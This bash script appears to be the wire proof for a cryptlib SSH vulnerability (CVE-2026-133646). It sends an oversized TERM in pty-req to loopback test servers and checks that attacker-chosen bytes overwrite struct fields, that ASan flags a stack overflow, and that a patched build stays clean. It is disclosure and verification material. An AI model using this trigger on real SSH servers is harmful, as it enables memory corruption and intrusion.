#!/usr/bin/env bash
# Wire proof for CVE-2026-133646: a loopback OpenSSH client sends an oversized
# TERM in pty-req; the vendored cryptlib built from pinned parent 42f586d7
# passes it to the pinned one-call getter. All network traffic is 127.0.0.1.
# Cases: chosen bytes at pinned sbbs_t offsets; 40-byte control; ASan
# redzone write; cb6d77dbca fixed-form control. No real Synchronet build.
set -uo pipefail
cd "$(dirname "$0")"
ROOT=../src-tree/3rdp/src/cl
LIB=$ROOT/libcl.a
test -f "$LIB" && test -f "$ROOT/cryptlib.h" || { echo "MISSING_CRYPTLIB"; exit 2; }

gcc -g -O0 -I"$ROOT" ssh_server6.c "$LIB" -lpthread -o ssh_server6 || exit 3
gcc -g -O0 -fsanitize=address -I"$ROOT" ssh_server7.c "$LIB" -lpthread \
    -o ssh_server7_asan || exit 3
gcc -g -O0 -fsanitize=address -I"$ROOT" ssh_server8.c "$LIB" -lpthread \
    -o ssh_server8_asan || exit 3

pass=0
fail=0
run_case() {
    local binary=$1 term_len=$2 out=$3 seconds=$4
    local term
    term=$(python3 -c "print('T' * $term_len, end='')")
    pgrep -f '/ssh_server[0-9]' | xargs -r kill 2>/dev/null
    : > "$out"
    ASAN_OPTIONS=detect_leaks=0 "./$binary" > "$out" 2>&1 &
    local pid=$!
    sleep 1
    (for i in $(seq 1 $((seconds / 2))); do echo x; sleep 0.2; done) | \
      TERM="$term" timeout $((seconds + 4)) ssh -tt \
        -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
        -o PreferredAuthentications=none -o PubkeyAuthentication=no \
        -o PasswordAuthentication=no -o KbdInteractiveAuthentication=no \
        -o HostKeyAlgorithms=+ssh-rsa -o ConnectTimeout=5 \
        -p 22222 lab@127.0.0.1 'cat' > /dev/null 2>&1
    wait "$pid" 2>/dev/null
}

expect() {
    local out=$1 pattern=$2 label=$3
    if grep -qE "$pattern" "$out"; then
        echo "PASS $label"
        pass=$((pass + 1))
    else
        echo "FAIL $label (missing: $pattern in $out)"
        fail=$((fail + 1))
    fi
}

mkdir -p evidence

run_case ssh_server6 64 evidence/proof-plain-64.out 8
expect evidence/proof-plain-64.out 'READER TERM status=0 len=64' 'wire TERM len=64'
expect evidence/proof-plain-64.out 'line_delay=0x54545454 console=0x54545454' \
    'chosen bytes at offsets 44/48'
expect evidence/proof-plain-64.out "wordwrap\[0\.\.7\]='TTTTTTTT'" \
    'chosen bytes at wordwrap[0..7]'

run_case ssh_server6 40 evidence/proof-plain-40.out 6
expect evidence/proof-plain-40.out 'READER TERM status=0 len=40' 'wire TERM len=40'
expect evidence/proof-plain-40.out 'line_delay=0x00000000 console=0x00000000' \
    '40-byte control clean'

run_case ssh_server7_asan 64 evidence/proof-asan-vuln-64.out 8
expect evidence/proof-asan-vuln-64.out 'AddressSanitizer: stack-buffer-overflow' \
    'ASan stack-buffer-overflow'
expect evidence/proof-asan-vuln-64.out 'WRITE of size 64' 'ASan WRITE of size 64'
expect evidence/proof-asan-vuln-64.out 'attributeCopyParams' 'ASan copy frame'

run_case ssh_server8_asan 64 evidence/proof-asan-fixed-64.out 8
expect evidence/proof-asan-fixed-64.out 'FIXED COPY status=0 len=64 byte40=00' \
    'fixed-form bounded copy'
if grep -q 'AddressSanitizer:' evidence/proof-asan-fixed-64.out; then
    echo "FAIL fixed-form ASan clean"
    fail=$((fail + 1))
else
    echo "PASS fixed-form ASan clean"
    pass=$((pass + 1))
fi

echo "RESULT: PASS=$pass FAIL=$fail"
test "$fail" -eq 0
